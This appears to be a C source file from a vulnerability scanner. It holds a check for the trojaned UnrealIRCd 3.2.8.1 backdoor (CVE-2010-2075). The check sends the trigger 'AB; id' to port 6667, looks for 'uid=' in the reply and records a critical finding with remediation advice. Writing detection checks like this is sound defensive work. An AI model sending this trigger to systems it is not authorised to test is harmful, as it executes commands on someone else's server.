#include <stdio.h>
#include <string.h>
#include "reconpulse/vuln_checks.h"
#include "reconpulse/netutils.h"

/* CVE-2010-2075 — the UnrealIRCd 3.2.8.1 tarball distributed between
 * Nov 2009 and Jun 2010 had its Config.c backdoored: any line prefixed
 * with "AB;" is executed as a shell command by the daemon. Metasploitable2
 * ships this exact build listening on 6667. */
void check_unrealircd_backdoor(const char *ip, const port_result_t *port, host_result_t *host, int timeout_ms)
{
    (void)port;
    socket_t sock = net_tcp_connect(ip, 6667, timeout_ms);
    if (sock == INVALID_SOCKET) return;

    const char *payload = "AB; id\n";
    if (net_send_all(sock, payload, (int)strlen(payload)) != 0) {
        net_close(sock);
        return;
    }

    char resp[512];
    net_recv_line(sock, resp, sizeof(resp), timeout_ms);
    net_close(sock);

    if (strstr(resp, "uid=")) {
        char evidence[300];
        snprintf(evidence, sizeof(evidence), "'AB; id' returned: %.200s", resp);
        host_add_finding(host, "CVE-2010-2075",
                          "UnrealIRCd 3.2.8.1 backdoor - remote command execution",
                          "The UnrealIRCd source tarball was trojaned to execute any line "
                          "prefixed with 'AB;' as a shell command.",
                          SEV_CRITICAL, CONF_CONFIRMED, evidence,
                          "Replace the binary with one built from an official, checksum-verified "
                          "source and upgrade to a maintained release.");
    }
}
